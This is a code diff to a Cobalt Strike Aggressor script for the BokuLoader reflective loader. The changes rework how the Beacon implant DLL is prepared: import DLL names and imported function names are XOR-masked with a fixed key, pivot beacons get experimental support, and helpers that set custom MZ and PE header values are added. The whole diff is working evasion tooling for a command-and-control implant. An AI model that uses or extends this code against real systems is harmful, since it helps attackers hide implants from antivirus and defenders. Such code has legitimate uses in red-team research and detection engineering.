@@ -42,6 +42,7 @@ sub my_dump_my_pe {
 # Open windows executable CS window with crtl+1 from GUI
 bind Ctrl+1 {
 	openWindowsExecutableStageDialog();
+	return;
 }
 
 sub array2Int {
@@ -65,7 +66,12 @@ sub getStringFromOffset {
 	$Offset     = $2;
 
 	$y = 0;
+	@chars =  @(0);
+	clear(@chars);
+	$tString = "";
 	while (true){
+		$indexer = 0;
+		$byte = 0;
 		$indexer = $Offset;
 		$indexer += $y;
 		$byte = byteAt($beacon_dll, $indexer);
@@ -79,64 +85,141 @@ sub getStringFromOffset {
 	return $tString;
 }
 
-sub boku_pe_mask_ImportDLLNames {
+
+sub boku_pe_mask_ImportStrings {
 	local('%pemap');
-	local('@import0A @import1A @import2A @import3A');
-    local('$import0 $import1 $import2 $import3');
-    local('$import0strlen $import1strlen $import2strlen $import3strlen');
-    local('$import0str $import1str $import2str $import3str');
-	local('$beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff');
-	local('@rdataRawA @rdataVAA');
+	local('$beacon_dll $xorKey');
+	local('$name_raw $dllstr_raw_vs_rva_diff $out @sorted_keys $key $val @import_dll_name_RVA $i');
+	local('@import_dll_string $import_dll_strlen @import_dll_OriginalFirstThunk_RVA');
+	local('$OriginalFirstThunk_RVA $j $oft_raw_vs_rva_diff $oft_raw $array_size_check');
 	$beacon_dll = $1;
 	$xorKey     = $2;
+	$isPivot    = $3;
+
+	%pemap = 0;
+	$name_rva = 0;
+	$dllstr_raw_vs_rva_diff = 0;
+	$out = 0;
+	$key = 0;
+	$val = 0;
+	$i = 0;
+	$import_dll_strlen = 0;
+	$OriginalFirstThunk_RVA = 0;
+	$j = 0;
+	$oft_raw_vs_rva_diff = 0;
+	$oft_raw = 0;
+	$array_size_check = 0;
+	@sorted_keys =  @(0);
+	clear(@sorted_keys);
+	@import_dll_OriginalFirstThunk_RVA =  @(0);
+	clear(@import_dll_OriginalFirstThunk_RVA);
+	@import_dll_name_RVA =  @(0);
+	clear(@import_dll_name_RVA);
+	@import_dll_string = @(0);
+	clear(@import_dll_string);
+
+	println("[+] Masking Import DLL names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+	println("|__ Finding Import RVAs from CS hashmap");
+
 	%pemap = pedump($beacon_dll);
+	# Get all import dll names from the CS pemap
+    @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
+    foreach $key (@sorted_keys)
+    {
+        $out = "$[50]key";
+        foreach $val (values(%pemap, @($key)))
+        {
+			if ("Import." isin $key)
+			{
+				if (".RVAModuleName.<value>" isin $key){
+					println("  |__ Found match:      ".$key." : 0x".uc(formatNumber($val, 16)));
+					# insert name_RVA into the beginning of the array
+					add(@import_dll_name_RVA,$val,0);
+				}
+				#if ($key hasmatch '(Import.*.RVAFunctionNameList.<value>)') {
+				if (".RVAFunctionNameList.<value>" isin $key){
+					println("  |__ Found match:      ".$key." : 0x".uc(formatNumber($val, 16)));
+					# insert OriginalFirstThunk into the beginning of the array
+					add(@import_dll_OriginalFirstThunk_RVA,$val,0);
+				}
+			}
+		}
+	}
+	# Sometimes CS will only find 1 DLL import module instead of all of them. Check that we have the correct #
+	# Pivot beacon should have 3 RVAs in the arrays. 1 for each import DLL
+	if ($isPivot == 1)
+	{
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_name_RVA);
+		println("[+] Found $array_size_check Import DLL name RVAs. Checking we have all 3 for Pivot beacon..")
+		if ($array_size_check < 3)
+		{
+			warn("Failed to to find the import DLL name strings! Only found $array_size_check of 3!");
+			return $null;
+		}
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_OriginalFirstThunk_RVA);
+		println("[+] Found $array_size_check Import DLL Original First Thunk RVAs. Checking we have all 3 for Pivot beacon..")
+		if ($array_size_check < 3)
+		{
+			warn("Failed to find the import entry first thunk! Only found $array_size_check of 3!");
+			return $null;
+		}
+	}
+	# HTTP/S beacon should have 4 RVAs in the arrays. 1 for each import DLL
+	if ($isPivot == 0)
+	{
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_name_RVA);
+		println("[+] Found $array_size_check Import DLL name RVAs. Checking we have all 4 for HTTP/S beacon..")
+		if ($array_size_check < 4)
+		{
+			warn("Failed to obfuscate the import DLL name import strings! Only found $array_size_check of 4!");
+			return $null;
+		}
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_OriginalFirstThunk_RVA);
+		println("[+] Found $array_size_check Import DLL Original First Thunk RVAs. Checking we have all 4 for HTTP/S beacon..")
+		if ($array_size_check < 4)
+		{
+			warn("Failed to find the import entry first thunk! Only found $array_size_check of 4!");
+			return $null;
+		}
+	}	
 
-	println("[+] Masking Import DLL Names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+	# Mask the Import DLL name strings for the DLL name (ex: "kernel32.dll")
+	$i = 0;
+	foreach $name_rva (@import_dll_name_RVA)
+	{
+		# Print Import DLL name string RVA
+		println("[".$i."] Import DLL name RVA         : 0x".uc(formatNumber($name_rva, 16)));
+		# Discover section for string location and get RVA vs raw difference
+		$dllstr_raw_vs_rva_diff = getSectionRawVsVirtualOffset($beacon_dll,$name_rva,0);
+		$name_raw = $name_rva - $dllstr_raw_vs_rva_diff;
+		# Print Import DLL name string raw addr
+		#println("|__ Import DLL name raw address : 0x".uc(formatNumber($name_raw, 16)));
+		# Get the length of the string so we know the len to XOR
+		@import_dll_string[$i] = getStringFromOffset($beacon_dll, $name_raw);
+		$import_dll_strlen = strlen(@import_dll_string[$i]);
+		# XOR the Import DLL name string
+		#println("|__ Masking DLL name: ".@import_dll_string[$i]);
+		$beacon_dll = pe_mask($beacon_dll, $name_raw, $import_dll_strlen, $xorKey);
 
-	@rdataRawA     = values(%pemap, @(".rdata.PointerToRawData.<value>"));
-	$rdataRaw      = @rdataRawA[0];
-	@rdataVAA      = values(%pemap, @(".rdata.VirtualAddress.<value>"));
-	$rdataVA       = @rdataVAA[0];
-	$rdataDiff     = $rdataVA - $rdataRaw;
+		$i++;
+	}
 
-	@import0A      = values(%pemap, @("Import.0.RVAModuleName.<value>"));
-	$import0       = @import0A[0];
-	$import0      -= $rdataDiff;
-	$import0str    = getStringFromOffset($beacon_dll, $import0);
-	$import0strlen = strlen($import0str);
+	# Mask the Import DLL name strings for imported APIs (ex: GetProcAddress)
+	$j = 0;
+	foreach $OriginalFirstThunk_RVA (@import_dll_OriginalFirstThunk_RVA)
+	{
+		# Print Import DLL OriginalFirstThunk RVA
+		#println("[" . $j . "] Masking import entry name strings for " . @import_dll_string[$j] . " DLL with single byte XOR key: 0x".uc(formatNumber($xorKey, 16)));
+		#println("|__ Import DLL OriginalFirstThunk RVA  : 0x".uc(formatNumber($OriginalFirstThunk_RVA, 16)));
+		
+		$beacon_dll = xor_ImportEntryNames($beacon_dll, $OriginalFirstThunk_RVA, $xorKey);
 
-	@import1A      = values(%pemap, @("Import.1.RVAModuleName.<value>"));
-	$import1       = @import1A[0];
-	$import1      -= $rdataDiff;
-	$import1str    = getStringFromOffset($beacon_dll, $import1);
-	$import1strlen = strlen($import1str);
-
-	@import2A      = values(%pemap, @("Import.2.RVAModuleName.<value>"));
-	$import2       = @import2A[0];
-	$import2      -= $rdataDiff;
-	$import2str    = getStringFromOffset($beacon_dll, $import2);
-	$import2strlen = strlen($import2str);
-
-	@import3A      = values(%pemap, @("Import.3.RVAModuleName.<value>"));
-	$import3       = @import3A[0];
-	$import3      -= $rdataDiff;
-	$import3str    = getStringFromOffset($beacon_dll, $import3);
-	$import3strlen = strlen($import3str);
-
-
-	println("|_ Plaintext DLL Import Names:  $import0str $import1str $import2str $import3str $import4str");
-
-	$beacon_dll = pe_mask($beacon_dll, $import0, $import0strlen, $xorKey);
-	$beacon_dll = pe_mask($beacon_dll, $import1, $import1strlen, $xorKey);
-	$beacon_dll = pe_mask($beacon_dll, $import2, $import2strlen, $xorKey);
-	$beacon_dll = pe_mask($beacon_dll, $import3, $import3strlen, $xorKey);
-
-	$import0str    = getStringFromOffset($beacon_dll, $import0);
-	$import1str    = getStringFromOffset($beacon_dll, $import1);
-	$import2str    = getStringFromOffset($beacon_dll, $import2);
-	$import3str    = getStringFromOffset($beacon_dll, $import3);
-
-	println("|_ XOR Masked DLL Import Names: $import0str $import1str $import2str $import3str $import4str");
+		$j++;
+	}
 
     return $beacon_dll;	
 }
@@ -200,157 +283,80 @@ sub boku_pe_mask_SectionNames {
 
 # Obfuscate all the Import Address Table Name Entry Strings with XOR 
 sub xor_ImportEntryNames {
-    local('@EntryThunkRVABytes @EntryNameBytes @zero');
+    local('@EntryThunk_8_bytes @EntryNameBytes');
     local('%pemap');
-    local('$EntryThunkRVA $key $NameEntryRVA $EntryName $maskkey $EntryIndexOffset $EntryThunkRVAOffset $EndOfImports');
-    local('$nullCheck $out $OrdinalCheck $thisByte $FirstThunk_RAW $xEntryNameOffset $NameString');
-    local('$StringSize $rdataRaw $rdataVA $rdataDiff $EntryNameOffsetNull');
-    local('$beacon_dll $xorKey');
+    local('$EntryThunk_raw $key $EntryName_rva $EntryName $maskkey $EntryThunk_offset $EntryThunk_byte_raw ');
+    local('$nullCheck $out $OrdinalCheck $EntryThunk_byte $FirstThunk_raw $EntryName_raw $EntryName_str');
+    local('$EntryName_strlen $rva_vs_raw_diff ');
+    local('@EntryName_rva_bytes $beacon_dll $xorKey $FirstThunk_rva');
 	 
-    $beacon_dll = $1;
-    $FirstThunk_RAW = $2;
-    $dataDiff   = $3;
-    $rdataDiff  = $4;
-    $xorKey     = $5;
+    $beacon_dll       = $1;
+    $FirstThunk_rva   = $2;
+    $xorKey           = $3;
 
-    #println("FirstThunk: $FirstThunk");
-    # -0x1400 from the VA to get the offset in the file for the import table
-    $FirstThunk_RAW -= $rdataDiff; 
-    $EntryThunkRVA = $FirstThunk_RAW;
-	#println("Original First Thunk RAW Offset : ".uc(formatNumber($FirstThunk_RAW, 16)));
-    $i = 0;
-    $EndOfImports = 1;
-    $nullCheck = 0;
-    @zero = @(0);
+    $rva_vs_raw_diff  = 0;
+    $i                = 0;
+    $nullCheck        = 0;
+
+	# Discover section RVA vs raw difference
+	$rva_vs_raw_diff  = getSectionRawVsVirtualOffset($beacon_dll,$FirstThunk_rva,0);
+	$FirstThunk_raw   = $FirstThunk_rva - $rva_vs_raw_diff;
+	#println("|__ FirstThunk raw address:        0x".uc(formatNumber($FirstThunk_raw, 16)));
 	
     while (1){
-        $OrdinalCheck = 0;
-        $EntryIndexOffset = 0;
-        $EntryThunkRVA = 0;
-        $EntryThunkRVAOffset = 0;
-        @EntryThunkRVABytes  = @(0,0,0,0,0,0,0,0);
-        $thisByte = 0;
+        $OrdinalCheck         = 0;
+        $EntryThunk_offset    = 0;
+        $EntryThunk_raw       = 0;
+        $EntryThunk_byte_raw  = 0;
+        @EntryThunk_8_bytes   = @(0,0,0,0,0,0,0,0);
+		@EntryName_rva_bytes  = @(0,0,0,0);
+        $EntryThunk_byte      = 0;
+		$EntryName_raw        = 0;
+		$EntryName_str        = "";
+		$EntryName_rva        = 0;
 
-        $EntryIndexOffset = $i * 8;
-        $EntryThunkRVA = $FirstThunk_RAW + $EntryIndexOffset;
-        #println("EntryThunk RVA : ".uc(formatNumber($EntryThunkRVA, 16)));
+        $EntryThunk_offset   = $i * 8;
+        $EntryThunk_raw      = $FirstThunk_raw + $EntryThunk_offset;
+        #println("EntryThunk raw address : ".uc(formatNumber($EntryThunk_raw, 16)));
 
-        # Get the 8 bytes which hold the RVA to the Import Name string
-		#printBytesAt($beacon_dll, $EntryThunkRVA, 8);
+        # Get the 8 bytes which hold the addr to the Import Name string
+		#printBytesAt($beacon_dll, $EntryThunk_raw, 8);
         for ($x = 0; $x < 8; $x++) {
-            $EntryThunkRVAOffset = $EntryThunkRVA;
-            $EntryThunkRVAOffset += $x;
-            $thisByte = byteAt($beacon_dll, $EntryThunkRVAOffset);
-            @EntryThunkRVABytes[$x] = $thisByte;
+            $EntryThunk_byte_raw    = $EntryThunk_raw + $x;
+            $EntryThunk_byte        = byteAt($beacon_dll, $EntryThunk_byte_raw);
+            @EntryThunk_8_bytes[$x] = $EntryThunk_byte;
         }
 
         # Check if the entry is an Ordinal 
-        $OrdinalCheck = pop(@EntryThunkRVABytes);
+        $OrdinalCheck        = pop(@EntryThunk_8_bytes);
         #println("OrdinalCheck : ".$OrdinalCheck);
-
         # Shrink the array down to 4 entries
-        @EntryThunkRVABytes = sublist(@EntryThunkRVABytes, 0, 4);
-
+        @EntryName_rva_bytes = sublist(@EntryThunk_8_bytes, 0, 4);
         # Convert the array into an integer
-        $NameEntryRVA = array2Int(@EntryThunkRVABytes);
+        $EntryName_rva       = array2Int(@EntryName_rva_bytes);
 
-		$xNameEntryRVA = 0;
-		$xNameEntryRVA = formatNumber($NameEntryRVA, 16);
-		$xNameEntryRVA = uc($xNameEntryRVA);
-	
 		# Last import entry for DLL will be 8 zeros. If found, exit the loop
-		if ($NameEntryRVA == 0){
+		if ($EntryName_rva == 0)
+		{
 			break;
 		}
 
-		$xEntryNameOffset = 0;
-		$NameString = 0;
 		# Only do string XORing for Imports that have Name strings
 		if ($OrdinalCheck == 0){
-
-			$EntryNameOffset = $NameEntryRVA - $rdataDiff; 
-			$EntryNameOffset += 2;
-
-			$xEntryNameOffset = formatNumber($EntryNameOffset, 16);
-			$xEntryNameOffset = uc($xEntryNameOffset);
-
-			$NameString = getStringFromOffset($beacon_dll, $EntryNameOffset);
-
-			# XOR the DLL import name
-			#$beacon_dll = pe_mask_string($beacon_dll, $EntryNameOffset, $xorKey);
+			$EntryName_raw    = $EntryName_rva - $rva_vs_raw_diff; 
+			$EntryName_raw   += 2;
+			#println("Entry name: 0x" . uc(formatNumber($EntryName_rva, 16))." (RVA)    |    0x".uc(formatNumber($EntryName_raw, 16))." (RAW)");
 
 			# pe_mask_string XORs the null string terminator byte which can causes an error in UDRL
-			$StringSize = strlen($NameString);
-			#println("|_ Entry Name Null byte position: 0x".formatNumber($EntryNameOffsetNull, 16));
-
-			$beacon_dll = pe_mask($beacon_dll, $EntryNameOffset, $StringSize, $xorKey);
-			#println("|_ $xNameEntryRVA   $xEntryNameOffset   $NameString");
-
+			$EntryName_str    = getStringFromOffset($beacon_dll, $EntryName_raw);
+			$EntryName_strlen = strlen($EntryName_str);
+			#println("  0x" . uc(formatNumber($EntryName_rva, 16))." (RVA)    |    0x".uc(formatNumber($EntryName_raw, 16))." (RAW)    | " . $EntryName_str);
+			$beacon_dll       = pe_mask($beacon_dll, $EntryName_raw, $EntryName_strlen, $xorKey);
 		}
 		$i++;
 	}
 	return $beacon_dll;
 }
-
-
-# Mask the DLL Import Entry Names for beacon. Does not mask Ordinal Entries.
-sub boku_pe_mask_ImportNames {
-	local('%pemap');
-	local('$temp_beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff $dataRaw $dataVA $dataDiff $K32_OFT_RVA $ADVAPI32_OFT_RVA $WININET_OFT_RVA $WS232_OFT_RVA');
-	local('@rdataRawA @rdataVAA @dataRawA @dataVAA @K32_VA_A @ADVAPI32_VA_A @WININET_VA_A @WS232_VA_A');
-	$temp_beacon_dll = $1;
-	$xorKey          = $2;
-
-	%pemap = pedump($temp_beacon_dll);
-
-	@rdataRawA = values(%pemap, @(".rdata.PointerToRawData.<value>"));
-	$rdataRaw  = @rdataRawA[0];
-
-	@rdataVAA  = values(%pemap, @(".rdata.VirtualAddress.<value>"));
-	$rdataVA   = @rdataVAA[0];
-
-	$rdataDiff = $rdataVA - $rdataRaw;
-
-	@dataRawA = values(%pemap, @(".data.PointerToRawData.<value>"));
-	$dataRaw  = @dataRawA[0];
-
-	@dataVAA  = values(%pemap, @(".data.VirtualAddress.<value>"));
-	$dataVA   = @dataVAA[0];
-
-	$dataDiff = $dataVA - $dataRaw;
-
-	println("Section   |     RAW Offset     | Virtual Address    | Raw Vs VA Difference");
-	println("--------------------------------------------------------------------------");
-	println("RDATA     |      0x".uc(formatNumber($rdataRaw, 16))."              0x".uc(formatNumber($rdataVA, 16))."               0x".uc(formatNumber($rdataDiff, 16))); 
-	println("DATA      |      0x".uc(formatNumber($dataRaw, 16))."              0x".uc(formatNumber($dataVA, 16))."               0x".uc(formatNumber($dataDiff, 16))); 
-
-	println("[+] XOR Masking Import Entry Name Strings");
-	
-	# Find the offsets to the import table DLL entries
-	@K32_VA_A      = values(%pemap, @("Import.0.RVAFunctionNameList.<value>"));
-	$K32_OFT_RVA   = @K32_VA_A[0];
-	@ADVAPI32_VA_A = values(%pemap, @("Import.1.RVAFunctionNameList.<value>"));
-	$ADVAPI32_OFT_RVA   = @ADVAPI32_VA_A[0];
-	@WININET_VA_A  = values(%pemap, @("Import.2.RVAFunctionNameList.<value>"));
-	$WININET_OFT_RVA    = @WININET_VA_A[0];
-	@WS232_VA_A    = values(%pemap, @("Import.3.RVAFunctionNameList.<value>"));
-	$WS232_OFT_RVA      = @WS232_VA_A[0];
-
-	println("DLL       |     Original First Thunk RVA  ");
-	println("----------------------------");
-	println("Kernel32  |      0x".uc(formatNumber($K32_OFT_RVA, 16)));
-	println("Advapi    |      0x".uc(formatNumber($ADVAPI32_OFT_RVA, 16)));
-	println("Wininet   |      0x".uc(formatNumber($WININET_OFT_RVA, 16)));
-	println("ws2_32    |      0x".uc(formatNumber($WS232_OFT_RVA, 16)));
-	# Obfuscate the import entry names with the XOR key
- 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $K32_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
- 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $ADVAPI32_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
- 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $WININET_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
-	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $WS232_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
-
-    return $temp_beacon_dll;	
-}
-
 
 sub setEgg{
 	local('@Bytes');
@@ -524,7 +530,7 @@ sub nullExportDirectory{
 	println("|__ Export Directory virtual address  : 0x".uc(formatNumber($ExportDirectory_VA, 16)));
 	println("|__ Export Directory size             : 0x".uc(formatNumber($ExportDirectory_size, 16)));
 	
-	$rawVsVirtualDiff = getSectionRawVsVirtualOffset($beacon_dll,$ExportDirectory_VA);
+	$rawVsVirtualDiff = getSectionRawVsVirtualOffset($beacon_dll,$ExportDirectory_VA,1);
 	$ExportDirectory_RawAddress = $ExportDirectory_VA - $rawVsVirtualDiff;
 	println("|__ Export Directory raw     address  : 0x".uc(formatNumber($ExportDirectory_RawAddress, 16)));
 
@@ -588,6 +594,7 @@ sub getSectionRawVsVirtualOffset{
 
 	$temp_beacon_dll          = $1;
 	$relative_virtual_address = $2;
+	$print_table              = $3;
 
 	%pemap = pedump($temp_beacon_dll);
 
@@ -621,34 +628,36 @@ sub getSectionRawVsVirtualOffset{
 	$dataVA   = @dataVAA[0];
 	$dataDiff = $dataVA - $dataRaw;
 
-	println("Section   |     RAW Offset     | Virtual Address    | Raw Vs VA Difference");
-	println("--------------------------------------------------------------------------");
-	println("TEXT      |      0x00".uc(formatNumber($textRaw, 16))."              0x0".uc(formatNumber($textVA, 16))."               0x0".uc(formatNumber($textDiff, 16))); 
-	println("RDATA     |      0x".uc(formatNumber($rdataRaw, 16))."              0x".uc(formatNumber($rdataVA, 16))."               0x".uc(formatNumber($rdataDiff, 16))); 
-	println("DATA      |      0x".uc(formatNumber($dataRaw, 16))."              0x".uc(formatNumber($dataVA, 16))."               0x".uc(formatNumber($dataDiff, 16))); 
-	println("PDATA     |      0x".uc(formatNumber($pdataRaw, 16))."              0x".uc(formatNumber($pdataVA, 16))."               0x".uc(formatNumber($pdataDiff, 16))); 
-	println("RELOC     |      0x".uc(formatNumber($relocRaw, 16))."              0x".uc(formatNumber($relocVA, 16))."               0x".uc(formatNumber($relocDiff, 16))); 
+	if ($print_table == 1){
+		println("Section   |     RAW Offset     | Virtual Address    | Raw Vs VA Difference");
+		println("--------------------------------------------------------------------------");
+		println("TEXT      |      0x00".uc(formatNumber($textRaw, 16))."              0x0".uc(formatNumber($textVA, 16))."               0x0".uc(formatNumber($textDiff, 16))); 
+		println("RDATA     |      0x".uc(formatNumber($rdataRaw, 16))."              0x".uc(formatNumber($rdataVA, 16))."               0x".uc(formatNumber($rdataDiff, 16))); 
+		println("DATA      |      0x".uc(formatNumber($dataRaw, 16))."              0x".uc(formatNumber($dataVA, 16))."               0x".uc(formatNumber($dataDiff, 16))); 
+		println("PDATA     |      0x".uc(formatNumber($pdataRaw, 16))."              0x".uc(formatNumber($pdataVA, 16))."               0x".uc(formatNumber($pdataDiff, 16))); 
+		println("RELOC     |      0x".uc(formatNumber($relocRaw, 16))."              0x".uc(formatNumber($relocVA, 16))."               0x".uc(formatNumber($relocDiff, 16))); 
+	}
 
 	if(($textVA <= $relative_virtual_address) && ($relative_virtual_address < $rdataVA)){
-		println("[+] Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .text section");
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .text section");
 		$rawVsVirtualDiff = $textDiff;
 	
 	}else if(($rdataVA <= $relative_virtual_address) && ($relative_virtual_address < $dataVA)){
-		println("[+] Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .rdata section");
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .rdata section");
 		$rawVsVirtualDiff = $rdataDiff;
 
 	}else if(($dataVA <= $relative_virtual_address) && ($relative_virtual_address < $pdataVA)){
-		println("[+] Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .data section");
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .data section");
 		$rawVsVirtualDiff = $dataDiff;
 
 	}else if(($pdataVA <= $relative_virtual_address) && ($relative_virtual_address < $rdataVA)){
-		println("[+] Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .pdata section");
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .pdata section");
 		$rawVsVirtualDiff = $pdataDiff;
 	}else{
-		println("[+] Out of options, probably RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .reloc section");
+		#println("|__ Out of options, probably RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .reloc section");
 		$rawVsVirtualDiff = $relocDiff;
 	}
-	println("[+] Raw vs VA section difference is 0x".uc(formatNumber($rawVsVirtualDiff, 16)));
+	#println("|__ Raw vs VA section difference is 0x".uc(formatNumber($rawVsVirtualDiff, 16)));
 	return $rawVsVirtualDiff;
 }
 
@@ -779,11 +788,43 @@ sub setChecksum{
 	return $temp_beacon_dll;
 }
 
+sub boku_pe_customPE{
+	local('$PEval');
+	$temp_dll = $1;
+	$PEval = 0xACDC;
+
+	$temp_dll = pe_set_short($temp_dll, 0x80, $PEval);
+	return $temp_dll;
+}
+
+
+sub boku_pe_customMZ{
+	local('$PEval');
+	$temp_dll = $1;
+	$MZval    = $2;
+
+	$temp_dll = pe_set_long($temp_dll, 0, $MZval);
+	return $temp_dll;
+}
+
 sub generate_my_dll {
 	
 	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
 	local('$prepend $magic_mz $smartinject $image_size_x64 $module_x64 $entry_point $xorKey');
-	local('$rich_header $checksum $compile_time $appended $magic_pe $DLL_name');
+	local('$rich_header $checksum $compile_time $appended $magic_pe $DLL_name $isPivot');
+
+	if ($3 eq "x86")
+	{
+		warn("Error: x86 not supported by BokuLoader.");
+		return $null;	
+	}
+
+	$isPivot = 0;
+	if ("pivot." isin $1)
+	{
+		warn("Pivot beacons are an experimental feature of BokuLoader, good luck!");
+		$isPivot = 1;
+	}
 
 	# Get C2 Malleable PE command options from the C2 profile
 	$profile = data_query("metadata")["c2profile"];
@@ -862,7 +903,7 @@ sub generate_my_dll {
 	#}
 	
 	# Now we should be good with optional_header values in the %pemap
-	my_dump_my_pe($temp_dll);
+	#my_dump_my_pe($temp_dll);
 	%pemap = pedump($temp_dll);
 	
 	## Set compile time from C2 profile 
@@ -896,9 +937,12 @@ sub generate_my_dll {
 
 	if ($obfuscate eq "true") {
 		$xorKey = 0xC3;
-		println("[+] Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
-		$temp_dll = boku_pe_mask_ImportNames($temp_dll, $xorKey);
-		$temp_dll = boku_pe_mask_ImportDLLNames($temp_dll, $xorKey);
+		println("## Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
+		$temp_dll = boku_pe_mask_ImportStrings($temp_dll, $xorKey, $isPivot);
+		if (strlen($temp_dll) eq 0) {
+			warn("Failed obfuscating beacon import DLL strings!");
+			return $null;
+		}
 		$temp_dll = boku_pe_mask_SectionNames($temp_dll, $xorKey);
 	} 
 	# honor C2 malleable PE modifications in C2 profile
@@ -910,6 +954,11 @@ sub generate_my_dll {
 #	$temp_dll = boku_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
 	$temp_dll = boku_strrep($temp_dll);
 #	$temp_dll = prependBytes($temp_dll);
+
+#	if ($magic_mz ne ""){
+#		$temp_dll = pe_set_string($temp_dll, 0, $magic_mz);
+#	}
+
 
 	return $temp_dll;
 }
